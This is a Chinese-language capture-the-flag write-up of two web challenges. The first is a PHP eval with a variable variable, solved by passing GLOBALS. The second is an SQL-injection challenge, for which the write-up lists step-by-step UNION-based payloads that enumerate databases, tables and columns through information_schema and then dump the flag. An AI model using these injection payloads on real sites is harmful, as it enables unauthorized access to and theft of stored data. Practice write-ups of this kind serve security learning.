### 变量1

**题目代码如下：**

```
`flag In the variable ! <?php  

error_reporting(0);
include "flag1.php";
highlight_file(__file__);
if(isset($_GET['args'])){
    $args = $_GET['args'];
    if(!preg_match("/^\w+$/",$args)){
        die("args error!");
    }
    eval("var_dump($$args);");
}
?>` 
```

**在解题之前，我们先插入一个知识点：**

```
`<?php 
$a = 'aa';
$aa = 'bb';
$b = $$a;
echo $b;
?> 

输出结果：
>>>bb` 
```

于是，这题思路就是将`$args`这个的数值变为一个变量！可以看出只要将`eval("var_dump($$args);");`这句话被执行，就可以得到我们想要的结果。
显然，GLOBALS存储所有变量的键/值，所以`args=GLOBALS`。

### 成绩查询

SQL注入题！简单题！

| 关键字 | 作用 |
| --- | --- |
| UNION | 将多个查询连接起来形成一张表 |
| group_concat(field) | 将每条数据的某几个字段连接成一条字符串 |
| information_schema.schemata | 存储所有schemata的各个属性的表 |
| information_schema.tables | 存储所有table的表,以及chemata的所有属性 |
| information_schema.columns | 存储所有field名字的表,以及table的所有属性和chemata的所有属性 |

第一步：暴库
id=-1’ union select 1,2,3,group_concat(schema_name) from information_schema.schemata#

第二步：爆表
id=-1’ union select 1,2,3,table_name from information_schema.tables where table_schema=0x736b6374665f666c6167#

第三步：爆字段
id=-1’ union select 1,2,3,column_name from information_schema.columns where table_name=0x666c3467#

第四步：爆内容
id=-1’ union select 1,2,3,group_concat(skctf_flag) from skctf_flag.fl4g#
